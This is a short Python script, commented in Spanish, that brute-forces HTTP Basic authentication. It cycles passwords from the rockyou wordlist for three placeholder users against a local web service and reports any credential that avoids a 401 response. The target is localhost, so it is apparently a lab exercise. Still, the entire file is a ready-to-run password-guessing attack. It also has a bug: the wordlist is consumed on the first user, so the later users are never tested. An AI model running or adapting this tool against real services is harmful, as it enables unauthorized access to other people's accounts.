#!/usr/bin/python3

import requests, sys, signal, time, pdb

from pwn import * 
from base64 import b64encode
from base64 import b64decode

# Ctrl + c 

def ctrl_c(frame, sig):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

signal.signal(signal.SIGINT, ctrl_c)

# Variables globales

main_url='http://127.0.0.1:3000'

##################################
def makeAuthentication(passb64, p1):
    
    headers = {
        'Authorization': 'Basic %s' % passb64
    }

    r = requests.get(main_url, headers=headers)

    if r.status_code != 401:
        p1.success("Se hayó una contraseña valida para el user %s ----> %s" % (b64decode(passb64).decode().split(":")[0], (b64decode(passb64).decode().split(":")[1])))
        sys.exit(0)


def to_base64():
    users = ["user1", "user2", "user3"]

    f = open("/usr/share/wordlists/rockyou.txt", "rb") # Rb formato byte, evitar posibles errores
    print("\n\n")
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    print("\n\n")
    time.sleep(2)

    for user in users:
        contador = 1
        for password  in f.readlines():
            #pdb.set_trace() # Para detener la línea en la ejecucion
            password = (password.strip()).decode()
            p1.status("Probando contraseña [%d/14344392] = %s para el usuario %s" % (contador, password, user))

            combination = user + ":" + password
            combination_base64 = b64encode(combination.encode())
            
            makeAuthentication(combination_base64.decode(), p1)
            contador += 1


if __name__ == '__main__':
    to_base64()

